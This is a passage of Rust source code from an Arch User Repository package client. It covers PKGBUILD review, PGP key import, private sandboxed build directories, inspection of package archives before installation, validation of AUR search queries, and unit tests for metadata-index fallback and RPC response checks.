                &source.digest,
                &review,
                pkgbuild_path,
                &extra_files,
                &install_hooks,
                verbose,
            )
        );

        if profile == crate::config::AurSecurityProfile::Hardened
            || !crate::core::privilege::get_yes_flag()
        {
            let proceed = confirm_prompt(pkgbuild_review_prompt(package), true).await?;
            if !proceed {
                anyhow::bail!("Build aborted by user after PKGBUILD review.");
            }
        }
        Ok(source)
    }

    /// Whether AUR builds will demand interactive PKGBUILD review. The
    /// settings field is private; parallel build orchestration needs this to
    /// bail before cloning when no terminal is available for the review.
    pub(crate) fn requires_interactive_review(&self) -> bool {
        self.settings.aur.review_pkgbuild
    }

    #[cfg(feature = "pgp")]
    async fn fetch_missing_pgp_keys(pkgbuild_path: &Path) -> Result<Option<tempfile::TempDir>> {
        use crate::core::security::keyserver;

        let pkgbuild_path = pkgbuild_path.to_path_buf();
        let keyring_state = tokio::task::spawn_blocking(move || {
            let pkgbuild = PkgBuild::parse(&pkgbuild_path).with_context(|| {
                format!(
                    "Failed to parse PKGBUILD at {} for PGP keys",
                    pkgbuild_path.display()
                )
            })?;
            if pkgbuild.validpgpkeys.is_empty() {
                return Ok(None);
            }
            let gnupg_home = std::env::var_os("GNUPGHOME")
                .map(PathBuf::from)
                .or_else(|| dirs::home_dir().map(|home| home.join(".gnupg")))
                .context("Cannot determine home directory for GnuPG keyring")?;
            let mut missing_keys = Vec::with_capacity(pkgbuild.validpgpkeys.len());
            for key_id in &pkgbuild.validpgpkeys {
                require_fetchable_pgp_key_id(key_id)?;
                match keyserver::is_key_in_gnupg(key_id, &gnupg_home) {
                    Ok(true) => {}
                    Ok(false) => missing_keys.push(key_id.clone()),
                    Err(error) => {
                        anyhow::bail!("Failed to read PGP keyring while checking {key_id}: {error}")
                    }
                }
            }
            Ok::<_, anyhow::Error>(Some((pkgbuild.validpgpkeys, missing_keys, gnupg_home)))
        })
        .await
        .context("AUR PGP keyring inspection task failed")??;
        let Some((valid_keys, missing_keys, gnupg_home)) = keyring_state else {
            return Ok(None);
        };

        let fetched_keys = if missing_keys.is_empty() {
            Vec::new()
        } else {
            tracing::info!("Fetching {} missing PGP key(s)...", missing_keys.len());
            keyserver::fetch_keys(&missing_keys)
                .await
                .into_iter()
                .map(|(key_id, result)| match result {
                    Ok(certificate) => Ok((key_id, certificate)),
                    Err(error) => Err(anyhow::anyhow!("Failed to fetch PGP key {key_id}: {error}")),
                })
                .collect::<Result<Vec<_>>>()?
        };
        let cache_dir = paths::cache_dir();

        tokio::task::spawn_blocking(move || {
            for (key_id, certificate) in fetched_keys {
                let info = keyserver::get_key_info(&certificate);
                tracing::debug!("Fetched PGP key: {info}");
                keyserver::import_key_into_gnupg(&certificate, &gnupg_home)
                    .with_context(|| format!("Failed to import key {key_id} into GnuPG"))?;
            }

            create_scoped_pgp_home(&valid_keys, &gnupg_home, &cache_dir).map(Some)
        })
        .await
        .context("AUR PGP key import task failed")?
    }

    #[cfg(not(feature = "pgp"))]
    #[expect(clippy::unused_async)]
    async fn fetch_missing_pgp_keys(_pkgbuild_path: &Path) -> Result<Option<tempfile::TempDir>> {
        tracing::debug!("PGP feature disabled, skipping key fetch");
        Ok(None)
    }

    fn sandbox_cache_mounts(cache_base: &Path, cache_dirs: &[PathBuf]) -> Result<Vec<PathBuf>> {
        let cache_base = cache_base.canonicalize().with_context(|| {
            format!(
                "Failed to canonicalize cache directory: {}",
                cache_base.display()
            )
        })?;
        let mut mounts = Vec::with_capacity(cache_dirs.len());

        for cache_dir in cache_dirs {
            let canonical = cache_dir.canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize compiler cache directory: {}",
                    cache_dir.display()
                )
            })?;
            anyhow::ensure!(
                canonical.starts_with(&cache_base),
                "Security: compiler cache directory escapes cache directory: {}",
                canonical.display()
            );
            if !mounts.contains(&canonical) {
                mounts.push(canonical);
            }
        }

        Ok(mounts)
    }

    async fn makepkg_env(&self, pkg_dir: &Path) -> Result<MakepkgEnv> {
        let client = self.clone();
        let pkg_dir = pkg_dir.to_path_buf();
        self.blocking_build_work(move || client.makepkg_env_sync(&pkg_dir))
            .await
            .context("AUR build environment task failed")
    }

    fn makepkg_env_sync(&self, pkg_dir: &Path) -> Result<MakepkgEnv> {
        let jobs = std::thread::available_parallelism().map_or(1, std::num::NonZero::get);
        let concurrent = self.settings.aur.build_concurrency.max(1);
        let makeflags = compiler_job_flags(
            self.settings.aur.makeflags.as_deref(),
            std::env::var("MAKEFLAGS").ok().as_deref(),
            jobs,
            concurrent,
        );

        // No recipe receives a shared writable cache. A failed or concurrent
        // build must never leave selectable outputs for a different invocation.
        let invocation_base = paths::cache_dir().join("_aur-invocations");
        create_dir_as_user_sync(&invocation_base)?;
        use std::os::unix::fs::PermissionsExt;
        // tempfile's directory default follows the process umask. Request
        // private permissions at creation, before any ownership handoff.
        let invocation = tempfile::Builder::new()
            .prefix("build-")
            .permissions(std::fs::Permissions::from_mode(0o700))
            .tempdir_in(&invocation_base)?;
        let owner = original_user()
            .map(|name| {
                let account = nix::unistd::User::from_name(&name)?
                    .with_context(|| format!("Original user '{name}' has no system account"))?;
                Ok::<_, anyhow::Error>((account.uid, account.gid))
            })
            .transpose()?;
        prepare_invocation_directory(invocation.path(), owner)?;
        let invocation_path = invocation.path().canonicalize()?;
        let checkout = pkg_dir.canonicalize()?;
        anyhow::ensure!(
            !invocation_path.starts_with(&checkout) && !checkout.starts_with(&invocation_path),
            "AUR checkout overlaps private invocation storage"
        );
        let pkgdest = invocation_path.join("packages");
        let srcdest = invocation_path.join("sources");
        let builddir = invocation_path
            .join("build")
            .join(pkg_dir.file_name().context("Missing AUR checkout name")?);
        create_dir_as_user_sync(&pkgdest)?;
        create_dir_as_user_sync(&srcdest)?;
        create_dir_as_user_sync(&builddir)?;
        if self.settings.aur.cache_builds
            || self.settings.aur.pkgdest.is_some()
            || self.settings.aur.srcdest.is_some()
            || self.settings.aur.ccache_dir.is_some()
            || self.settings.aur.sccache_dir.is_some()
        {
            tracing::warn!(
                "AUR builds use private invocation storage; persistent build/source/compiler caches and custom cache destinations are disabled"
            );
        }

        let mut compiler_cache_dirs = Vec::new();
        let mut extra_env = Vec::new();

        if self.settings.aur.enable_ccache {
            let ccache_dir = invocation_path.join("ccache");
            create_dir_as_user_sync(&ccache_dir)?;
            let ccache_dir = ccache_dir.canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize ccache directory: {}",
                    ccache_dir.display()
                )
            })?;
            compiler_cache_dirs.push(ccache_dir.clone());
            extra_env.push((
                "CCACHE_DIR".to_string(),
                ccache_dir.to_string_lossy().into_owned(),
            ));
            extra_env.push((
                "CCACHE_BASEDIR".to_string(),
                pkg_dir.to_string_lossy().into_owned(),
            ));
        }

        if self.settings.aur.enable_sccache {
            let sccache_dir = invocation_path.join("sccache");
            create_dir_as_user_sync(&sccache_dir)?;
            let sccache_dir = sccache_dir.canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize sccache directory: {}",
                    sccache_dir.display()
                )
            })?;
            if !compiler_cache_dirs.contains(&sccache_dir) {
                compiler_cache_dirs.push(sccache_dir.clone());
            }
            extra_env.push(("RUSTC_WRAPPER".to_string(), "sccache".to_string()));
            extra_env.push((
                "SCCACHE_DIR".to_string(),
                sccache_dir.to_string_lossy().into_owned(),
            ));
        }

        Ok(MakepkgEnv {
            _invocation: invocation,
            makeflags,
            pkgdest,
            srcdest,
            builddir,
            compiler_cache_dirs,
            extra_env,
            pgp_home: None,
        })
    }

    #[cfg(test)]
    fn cache_key(&self, pkg_dir: &Path, makeflags: &str) -> Result<String> {
        let source = ReviewedSource::capture(pkg_dir)?;
        let makepkg_args = self.makepkg_args().join(" ");
        let build_method = format!("{:?}", self.settings.aur.build_method);
        let mut hasher = Sha256::new();
        hasher.update(b"omg-aur-source-v2\0");
        for value in [
            source.digest.as_str(),
            makeflags,
            makepkg_args.as_str(),
            build_method.as_str(),
            if self.settings.aur.secure_makepkg {
                "true"
            } else {
                "false"
            },
        ] {
            hasher.update((value.len() as u64).to_le_bytes());
            hasher.update(value.as_bytes());
        }
        Ok(hex::encode(hasher.finalize()))
    }

    #[cfg(test)]
    fn cache_path(&self, package: &str) -> PathBuf {
        self.build_dir
            .join("_buildcache")
            .join(format!("{package}.hash"))
    }

    /// Legacy hash markers bind source text only, not the complete archive.
    /// Do not promote recipe-writable payloads into trusted cache entries.
    /// Reuse stays disabled until controller-owned archive provenance exists.
    #[cfg(test)]
    fn cached_artifacts(
        _cache_name: &str,
        _artifacts: &[String],
        _pkg_dir: &Path,
        _pkgdest: &Path,
        _cache_key: &str,
    ) -> Option<Vec<PathBuf>> {
        None
    }

    /// Install the built package via direct ALPM or elevated OMG transaction.
    pub(crate) async fn install_built_packages(
        batches: &[BuiltPackages],
        sudoloop: Option<&crate::core::sudoloop::SudoLoop>,
    ) -> Result<()> {
        if batches.is_empty() || batches.iter().any(|batch| batch.archives.is_empty()) {
            anyhow::bail!("AUR build produced no package archives to install");
        }

        let settings = Settings::load()?;
        settings.aur.validate_security_profile()?;
        let profile = settings.aur.security_profile;
        let mut inspections = Vec::new();
        let mut items = Vec::new();
        for batch in batches {
            batch.require_profile(profile)?;
            for snapshot in &batch.archives {
                let inspection =
                    artifact_inspector::inspect_archive(&snapshot.path())?.into_inspection();
                snapshot.verify_sha256(&inspection.archive_sha256)?;
                inspection.enforce_profile(profile)?;
                items.push(InstallItem {
                    target: InstallTarget::Archive(snapshot.handoff()),
                    intent: if batch.requested_outputs.contains(&inspection.package_name) {
                        InstallIntent::Requested
                    } else {
                        InstallIntent::Automatic
                    },
                });
                inspections.push(inspection);
            }
        }
        if let Some(prompt) = approval::exception_prompt(&inspections)? {
            let evidence = inspections
                .iter()
                .flat_map(artifact_inspector::ArtifactInspection::audit_details)
                .collect::<Vec<_>>();
            if !console::user_attended() {
                crate::core::security::audit::record_operation(
                    "aur_privilege_approval",
                    &evidence,
                    "rejected_unattended",
                )?;
                anyhow::bail!(
                    "AUR archive requests an install hook, setuid/setgid mode, or file capability; attended approval is required"
                );
            }
            if !confirm_prompt(prompt, false).await? {
                crate::core::security::audit::record_operation(
                    "aur_privilege_approval",
                    &evidence,
                    "rejected",
                )?;
                anyhow::bail!("AUR exceptional privilege request was not approved");
            }
            crate::core::security::audit::record_operation(
                "aur_privilege_approval",
                &evidence,
                "approved",
            )?;
        }

        // Serialize database mutations across all concurrent builds.
        let _install_guard = INSTALL_LOCK.lock().await;

        if let Some(sl) = sudoloop {
            sl.refresh_now().await;
        }
        let settings = Settings::load()?;
        settings.aur.validate_security_profile()?;
        let current_profile = settings.aur.security_profile;
        for batch in batches {
            batch.require_profile(current_profile)?;
        }
        for inspection in &inspections {
            inspection.enforce_profile(current_profile)?;
        }
        crate::package_managers::arch::install_request(InstallRequest::new(items)?).await?;

        Ok(())
    }

    pub fn clean_all(&self) -> Result<()> {
        // Never unlink the coordination inode. Fail fast rather than wait for
        // a build that may be awaiting user input or resolving dependencies.
        let lifecycle_guard = self.open_lifecycle_lock()?;
        lifecycle_guard
            .try_lock()
            .context("Cannot clean AUR cache: a build or another cleanup may be active")?;
        if self.build_dir.exists() {
            if let Some(user) = original_user() {
                let status = sudo_as_user_program(&user, "rm")?
                    .args(["-rf", "--"])
                    .arg(&self.build_dir)
                    .status()?;
                if !status.success() {
                    anyhow::bail!("Failed to clean directory as user '{user}'");
                }
                let status = sudo_as_user_program(&user, "mkdir")?
                    .args(["-p", "--"])
                    .arg(&self.build_dir)
                    .status()?;
                if !status.success() {
                    anyhow::bail!("Failed to recreate directory as user '{user}'");
                }
            } else {
                std::fs::remove_dir_all(&self.build_dir)?;
                std::fs::create_dir_all(&self.build_dir)?;
            }
            println!(
                "{} Cleaned all AUR build directories",
                crate::cli::style::positive("✓")
            );
        }
        Ok(())
    }
}

fn validate_index_entry_name(name: &str, expected: Option<&str>) -> Result<()> {
    crate::core::security::validate_package_name(name)
        .context("AUR index contains an invalid package name")?;
    if let Some(expected) = expected {
        anyhow::ensure!(
            name == expected,
            "AUR index returned unexpected package '{name}' for '{expected}'"
        );
    }
    Ok(())
}

fn validate_search_query(query: &str) -> Result<()> {
    if query.len() > AUR_SEARCH_MAX_BYTES {
        anyhow::bail!("Search query too long (max {AUR_SEARCH_MAX_BYTES} bytes)");
    }
    if query.chars().any(char::is_control) {
        anyhow::bail!("Search query contains invalid control characters");
    }
    if query.trim().len() < 2 {
        anyhow::bail!("Search query must contain at least 2 non-whitespace bytes");
    }
    Ok(())
}

/// Search AUR with detailed info
pub async fn search_detailed(query: &str) -> Result<Vec<AurPackageDetail>> {
    validate_search_query(query)?;

    let url = format!(
        "{AUR_RPC_URL}?v=5&type=search&arg={}",
        urlencoding::encode(query)
    );

    let response = shared_client()
        .get(&url)
        .send()
        .await
        .map_err(redact_aur_transport_error)?;
    let response: AurDetailedResponse = decode_aur_rpc_response(response).await?;

    // SECURITY: Validate all names in response
    let mut results = response
        .results
        .into_iter()
        .filter(|p| {
            if let Err(e) = crate::core::security::validate_package_name(&p.name) {
                tracing::warn!(
                    "Rejecting invalid package name from AUR search_detailed: {} ({})",
                    p.name,
                    e
                );
                false
            } else {
                true
            }
        })
        .collect::<Vec<_>>();

    // Rank exact, prefix, and word-boundary matches before popularity.
    let query_lower = query.to_ascii_lowercase();
    results.sort_by(|a, b| {
        let a_name_lower = a.name.to_ascii_lowercase();
        let b_name_lower = b.name.to_ascii_lowercase();

        // Exact match check
        let a_exact = a_name_lower == query_lower;
        let b_exact = b_name_lower == query_lower;
        if a_exact != b_exact {
            return b_exact.cmp(&a_exact);
        }

        // Prefix match check
        let a_prefix = a_name_lower.starts_with(&query_lower);
        let b_prefix = b_name_lower.starts_with(&query_lower);
        if a_prefix != b_prefix {
            return b_prefix.cmp(&a_prefix);
        }

        // Word boundary match check (uses module-level helper)
        let a_word = has_word_boundary_match(&a_name_lower, &query_lower);
        let b_word = has_word_boundary_match(&b_name_lower, &query_lower);
        if a_word != b_word {
            return b_word.cmp(&a_word);
        }

        // Final tiebreaker: popularity (more popular first)
        b.popularity
            .partial_cmp(&a.popularity)
            .unwrap_or(std::cmp::Ordering::Equal)
    });

    Ok(results)
}

#[derive(Debug, Deserialize)]
struct AurDetailedResponse {
    results: Vec<AurPackageDetail>,
}

#[derive(Debug, Deserialize, Clone)]
pub struct AurPackageDetail {
    #[serde(rename = "Name")]
    pub name: String,
    #[serde(rename = "Version")]
    pub version: String,
    #[serde(rename = "Description")]
    pub description: Option<String>,
    #[serde(rename = "Maintainer")]
    pub maintainer: Option<String>,
    #[serde(rename = "NumVotes")]
    pub num_votes: i32,
    #[serde(rename = "Popularity")]
    pub popularity: f64,
    #[serde(rename = "OutOfDate")]
    pub out_of_date: Option<i64>,
    #[serde(rename = "FirstSubmitted")]
    pub first_submitted: i64,
    #[serde(rename = "LastModified")]
    pub last_modified: i64,
    #[serde(rename = "URL")]
    pub url: Option<String>,
    #[serde(rename = "Depends")]
    pub depends: Option<Vec<String>>,
    #[serde(rename = "License")]
    pub license: Option<Vec<String>>,
}

fn compiler_job_flags(
    configured: Option<&str>,
    env_makeflags: Option<&str>,
    cpu_jobs: usize,
    concurrent_builds: usize,
) -> String {
    if let Some(flags) = configured.filter(|flags| !flags.is_empty()) {
        return flags.to_string();
    }
    if let Some(flags) = env_makeflags.filter(|flags| !flags.is_empty()) {
        return flags.to_string();
    }
    let per_build = cpu_jobs.saturating_div(concurrent_builds.max(1)).max(1);
    if per_build > 1 {
        format!("-j{per_build}")
    } else {
        String::new()
    }
}

#[cfg(test)]
#[expect(clippy::unwrap_used)] // Idiomatic in tests: panics on failure with clear error context
mod tests {
    use super::*;
    use crate::package_managers::aur_metadata::{index_path, metadata_path, publish_test_metadata};

    // S72 fixture methods must run in a dedicated unprivileged receiver. A root
    // invocation is a fixture prerequisite error, never the behavioral RED.
    fn s72_rpc_json(rows: &[(&str, &str)]) -> Vec<u8> {
        serde_json::to_vec(&serde_json::json!({"type": "multiinfo", "results":
            rows.iter().map(|(name, version)| serde_json::json!({
                "Name": name, "Version": version, "Description": null,
                "Maintainer": null, "NumVotes": 0, "Popularity": 0.0,
                "OutOfDate": null, "LastModified": 1
            })).collect::<Vec<_>>()
        }))
        .unwrap()
    }

    async fn s72_info_reply(rows: &[(&str, &str)], requested: &[&str]) -> Result<AurResponse> {
        let (endpoint, server) = rpc_body_server(s72_rpc_json(rows), false).await?;
        let names = requested
            .iter()
            .map(|name| (*name).to_owned())
            .collect::<Vec<_>>();
        let result = tokio::time::timeout(
            Duration::from_secs(5),
            AurClient::rpc_info_chunk_at(&endpoint, &names),
        )
        .await?;
        tokio::time::timeout(Duration::from_secs(5), server).await???;
        result
    }

    #[tokio::test]
    async fn aur_rpc_info_rejects_unrequested_package() -> Result<()> {
        let result = s72_info_reply(&[("core-demo", "2.0-1")], &["aur-demo"]).await;
        let error = result.expect_err("info response must be bound to this request chunk");
        assert!(
            error.to_string().contains("unrequested package"),
            "{error:#}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn aur_rpc_info_rejects_duplicate_and_conflicting_rows() -> Result<()> {
        for second_version in ["2.0-1", "3.0-1"] {
            let result = s72_info_reply(
                &[("aur-demo", "2.0-1"), ("aur-demo", second_version)],
                &["aur-demo"],
            )
            .await;
            let error = result.expect_err("one requested name must have at most one result");
            assert!(error.to_string().contains("duplicate package"), "{error:#}");
        }
        Ok(())
    }

    #[tokio::test]
    async fn aur_rpc_info_allows_reordered_partial_and_empty_results() -> Result<()> {
        let requested = &["aur-demo", "other-demo", "gone-demo"];
        let response =
            s72_info_reply(&[("other-demo", "2.0-1"), ("aur-demo", "2.0-1")], requested).await?;
        let identities: Vec<_> = response
            .results
            .iter()
            .map(|package| (package.name.as_str(), package.version.as_str()))
            .collect();
        assert_eq!(identities, [("other-demo", "2.0-1"), ("aur-demo", "2.0-1")]);
        let empty = s72_info_reply(&[], requested).await?;
        assert!(
            empty.results.is_empty(),
            "deleted AUR packages may be absent"
        );
        Ok(())
    }

    struct S72Fixture {
        directory: tempfile::TempDir,
        conf: PathBuf,
        db: PathBuf,
    }

    impl S72Fixture {
        fn new(names: &[&str]) -> Result<Self> {
            anyhow::ensure!(
                !crate::core::is_root(),
                "S72 prerequisite: isolated receiver must be unprivileged; do not write canonical root paths"
            );
            let directory = tempfile::tempdir_in("/var/tmp")?;
            let root = directory.path().join("root");
            let db = directory.path().join("db");
            let cache = directory.path().join("cache");
            let conf = directory.path().join("pacman.conf");
            std::fs::create_dir_all(&root)?;
            std::fs::create_dir_all(db.join("sync"))?;
            std::fs::create_dir_all(&cache)?;
            for name in names {
                let dir = db.join("local").join(format!("{name}-1.0-1"));
                std::fs::create_dir_all(&dir)?;
                std::fs::write(
                    dir.join("desc"),
                    format!(
                        "%NAME%\n{name}\n\n%VERSION%\n1.0-1\n\n%DESC%\nS72 fixture\n\n%REASON%\n0\n\n%INSTALLDATE%\n1\n\n"
                    ),
                )?;
            }
            std::fs::write(&conf, "[options]\n")?;
            paths::set_test_overrides(Some(root), Some(db.clone()));
            Ok(Self {
                directory,
                conf,
                db,
            })
        }

        fn with_environment(
            &self,
            future: impl std::future::Future<Output = Result<()>>,
        ) -> Result<()> {
            let cache = self.directory.path().join("cache");
            temp_env::with_vars(
                [
                    ("OMG_TEST_MODE", None::<&std::ffi::OsStr>),
                    ("OMG_PACMAN_CONF", Some(self.conf.as_os_str())),
                    ("OMG_CACHE_DIR", Some(cache.as_os_str())),
                ],
                || -> Result<()> {
                    assert_eq!(paths::pacman_conf_path(), self.conf);
                    assert_eq!(paths::cache_dir(), cache);
                    pacman_db::invalidate_caches()?;
                    tokio::runtime::Builder::new_current_thread()
                        .enable_all()
                        .build()?
                        .block_on(future)
                },
            )
        }

        fn client(&self) -> AurClient {
            let mut settings = Settings::default();
            settings.aur.use_metadata_archive = true;
            settings.aur.metadata_cache_ttl_secs = 3600;
            AurClient {
                build_dir: self.directory.path().join("build"),
                settings,
                package_base_locks: Arc::new(dashmap::DashMap::new()),
            }
        }

        fn index(names: &[&str]) -> Result<()> {
            let archive = metadata_path();
            std::fs::create_dir_all(archive.parent().unwrap())?;
            let data = names
                .iter()
                .map(|name| (*name, "2.0-1"))
                .collect::<Vec<_>>();
            let envelope: serde_json::Value = serde_json::from_slice(&s72_rpc_json(&data))?;
            let file = File::create(&archive)?;
            let mut gzip = flate2::write::GzEncoder::new(file, flate2::Compression::default());
            std::io::Write::write_all(&mut gzip, &serde_json::to_vec(&envelope["results"])?)?;
            gzip.finish()?;
            publish_test_metadata(&archive)?;
            anyhow::ensure!(
                open_fresh_metadata_index(Duration::from_hours(1))?.is_some(),
                "fixture index must actually be fresh and coherent"
            );
            Ok(())
        }

        fn local_bytes(&self) -> Result<Vec<(String, Vec<u8>)>> {
            let mut files = Vec::new();
            for entry in std::fs::read_dir(self.db.join("local"))? {
                let entry = entry?;
                files.push((
                    entry.file_name().to_string_lossy().into_owned(),
                    std::fs::read(entry.path().join("desc"))?,
                ));
            }
            files.sort_by(|a, b| a.0.cmp(&b.0));
            Ok(files)
        }
    }

    impl Drop for S72Fixture {
        fn drop(&mut self) {
            paths::reset_test_overrides();
        }
    }

    #[test]
    fn aur_metadata_reader_lock_failure_preserves_generation() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::aur_metadata_reader_lock_failure_preserves_generation";
        if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let fixture = S72Fixture::new(&["installed-demo"])?;
        fixture.with_environment(async {
            S72Fixture::index(&["metadata-demo"])?;
            let client = fixture.client();
            let snapshot = client
                .fresh_metadata_index()
                .await
                .context("published metadata must be readable before the lock fault")?;
            assert_eq!(
                snapshot
                    .get("metadata-demo")?
                    .context("published package")?
                    .version
                    .as_str(),
                "2.0-1"
            );
            let local_before = fixture.local_bytes()?;
            let metadata_root = paths::cache_dir().join("aur/_meta");
            let manifest = metadata_root.join("manifest.json");
            let manifest_before = std::fs::read(&manifest)?;
            let published: serde_json::Value = serde_json::from_slice(&manifest_before)?;
            let generation = metadata_root.join(
                published["generation"]
                    .as_str()
                    .context("published fixture must name its generation")?,
            );
            let archive = generation.join("archive.gz");
            let index = generation.join("index.rkyv");
            let archive_before = std::fs::read(&archive)?;
            let index_before = std::fs::read(&index)?;
            let lock = metadata_root.join("publication.lock");
            let saved_lock = metadata_root.join("publication.lock.saved");
            std::fs::rename(&lock, &saved_lock)?;
            std::fs::create_dir(&lock)?;

            let error = open_fresh_metadata_index(Duration::from_hours(1))
                .expect_err("a directory cannot be opened as the metadata publication lock");
            assert!(
                error
                    .chain()
                    .any(|cause| cause.downcast_ref::<std::io::Error>().is_some()),
                "the fixture must exercise a real metadata I/O failure: {error:#}"
            );
            assert!(
                client.fresh_metadata_index().await.is_none(),
                "an unreadable metadata generation must fall back instead of failing the caller"
            );
            assert!(
                lock.is_dir(),
                "reader fallback must preserve the failed lock for diagnosis"
            );
            assert_eq!(std::fs::read(&manifest)?, manifest_before);
            assert_eq!(std::fs::read(&archive)?, archive_before);
            assert_eq!(std::fs::read(&index)?, index_before);
            assert_eq!(fixture.local_bytes()?, local_before);
            assert!(
                snapshot.get("metadata-demo")?.is_some(),
                "an earlier owned snapshot stays usable"
            );

            std::fs::remove_dir(&lock)?;
            std::fs::rename(&saved_lock, &lock)?;
            assert!(
                client.fresh_metadata_index().await.is_some(),
                "restored access must make the same generation readable again"
            );
            Ok(())
        })
    }

    #[test]
    fn aur_metadata_task_completion_preserves_snapshots_and_falls_back() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::aur_metadata_task_completion_preserves_snapshots_and_falls_back";
        if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let fixture = S72Fixture::new(&[])?;
        fixture.with_environment(async {
            S72Fixture::index(&["metadata-demo"])?;
            let index = open_fresh_metadata_index(Duration::from_hours(1))?
                .context("published metadata fixture must contain an index")?;
            let snapshot = finish_metadata_read(tokio::spawn(async move { Ok(Some(index)) }))
                .await
                .context("a successful metadata worker must retain its owned snapshot")?;
            assert_eq!(
                snapshot
                    .get("metadata-demo")?
                    .context("published package")?
                    .version
                    .as_str(),
                "2.0-1"
            );
            assert!(
                finish_metadata_read(tokio::spawn(async { Ok(None) }))
                    .await
                    .is_none()
            );
            assert!(
                finish_metadata_read(tokio::spawn(async {
                    Err(std::io::Error::new(
                        std::io::ErrorKind::PermissionDenied,
                        "metadata reader sentinel",
                    )
                    .into())
                }))
                .await
                .is_none(),
                "metadata-reader errors must leave the caller free to use RPC"
            );
            let panicked = tokio::spawn(async {
                panic!("metadata worker panic sentinel");
            });
            assert!(
                finish_metadata_read(panicked).await.is_none(),
                "a real panicked task must use the same fallback contract"
            );

            let (started, entered) = tokio::sync::oneshot::channel();
            let cancelled = tokio::spawn(async move {
                started
                    .send(())
                    .expect("cancellation observer remains alive");
                std::future::pending::<Result<Option<AurIndex>>>().await
            });
            entered
                .await
                .context("metadata cancellation task must have started")?;
            cancelled.abort();
            assert!(
                finish_metadata_read(cancelled).await.is_none(),
                "a genuinely cancelled async task must fall back without propagating a JoinError"
            );
            assert!(
                snapshot.get("metadata-demo")?.is_some(),
                "task failures must not invalidate a separately owned index"
            );
            Ok(())
        })
    }

    #[test]
    fn aur_official_dependencies_reject_oversized_install_request_before_mutation() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::aur_official_dependencies_reject_oversized_install_request_before_mutation";
        if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let fixture = S72Fixture::new(&["installed-demo"])?;
        fixture.with_environment(async {
            let local_before = fixture.local_bytes()?;
            let selected = (0..4_097)
                .map(|index| {
                    let name = format!("dependency-{index}");
                    OfficialTarget {
                        repository: "fixture".to_owned(),
                        relations: vec![format!("{name}>=1")],
                        name,
                    }
                })
                .collect::<Vec<_>>();
            let error = AurClient::install_official_dependencies(&selected)
                .await
                .expect_err(
                    "an oversized dependency graph must be refused at the bounded request boundary",
                );
            assert_eq!(
                error.to_string(),
                "Invalid installation item count",
                "the refusal must occur before native installation or elevation: {error:#}"
            );
            assert_eq!(
                fixture.local_bytes()?,
                local_before,
                "bounded-request refusal must preserve the installed catalog"
            );
            assert!(
                !fixture.db.join("db.lck").exists(),
                "request refusal must not acquire a native transaction lock"
            );
            Ok(())
        })
    }

    #[test]
    fn aur_updates_honor_exact_and_glob_ignore_pkg_in_fresh_index() -> Result<()> {
        if crate::core::testing::run_isolated_test(
            "package_managers::aur::client::tests::aur_updates_honor_exact_and_glob_ignore_pkg_in_fresh_index",
        ) {
            return Ok(());
        }
        if Settings::rerun_test_unprivileged(
            "package_managers::aur::client::tests::aur_updates_honor_exact_and_glob_ignore_pkg_in_fresh_index",
        ) {
            return Ok(());
        }
        let fixture = S72Fixture::new(&["held-demo", "held-extra", "free-demo"])?;
        fixture.with_environment(async {
            S72Fixture::index(&["held-demo", "held-extra", "free-demo"])?;
            let client = fixture.client();
            let before = fixture.local_bytes()?;
            let names = |mut updates: Vec<(String, Version, Version)>| {
                updates.sort_by(|a, b| a.0.cmp(&b.0));
                for (_, old, new) in &updates {
                    assert_eq!(old.to_string(), "1.0-1");
                    assert_eq!(new.to_string(), "2.0-1");
                }
                updates.into_iter().map(|row| row.0).collect::<Vec<_>>()
            };
            assert_eq!(
                names(client.get_update_list().await?),
                ["free-demo", "held-demo", "held-extra"]
            );
            std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held-demo\n")?;
            assert_eq!(
                names(client.get_update_list().await?),
                ["free-demo", "held-extra"]
            );
            std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held-*\n")?;
            assert_eq!(names(client.get_update_list().await?), ["free-demo"]);
            assert_eq!(
                fixture.local_bytes()?,
                before,
                "update reads preserve package state"
            );
            Ok(())
        })
    }

    #[test]
    fn aur_updates_empty_local_catalog_does_not_require_index_or_rpc() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::aur_updates_empty_local_catalog_does_not_require_index_or_rpc";
        if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let fixture = S72Fixture::new(&[])?;
        std::fs::create_dir(fixture.db.join("local"))?;
        fixture.with_environment(async {
            assert!(get_potential_aur_packages()?.is_empty());
            assert!(!metadata_path().exists() && !index_path().exists());
            let updates =
                tokio::time::timeout(Duration::from_secs(2), fixture.client().get_update_list())
                    .await
                    .context("an empty installed catalog must complete without AUR RPC")??;
            assert!(updates.is_empty());
            assert!(!metadata_path().exists() && !index_path().exists());
            assert!(fixture.local_bytes()?.is_empty());
            Ok(())
        })
    }

    #[test]
    fn aur_updates_all_ignored_do_not_require_index_or_rpc() -> Result<()> {
        if crate::core::testing::run_isolated_test(
            "package_managers::aur::client::tests::aur_updates_all_ignored_do_not_require_index_or_rpc",
        ) {
            return Ok(());
        }
        if Settings::rerun_test_unprivileged(
            "package_managers::aur::client::tests::aur_updates_all_ignored_do_not_require_index_or_rpc",
        ) {
            return Ok(());
        }
        let fixture = S72Fixture::new(&["held-demo"])?;
        fixture.with_environment(async {
            std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held-*\n")?;
            assert!(!metadata_path().exists() && !index_path().exists());
            let before = fixture.local_bytes()?;
            let result =
                tokio::time::timeout(Duration::from_secs(2), fixture.client().get_update_list())
                    .await;
            let updates = result.expect("ignored-only update check must complete without RPC")?;
            assert!(updates.is_empty());
            assert_eq!(fixture.local_bytes()?, before);
            Ok(())
        })
    }

    #[test]
    fn aur_rpc_updates_rejects_unsolicited_installed_official_package() -> Result<()> {
        if crate::core::testing::run_isolated_test(
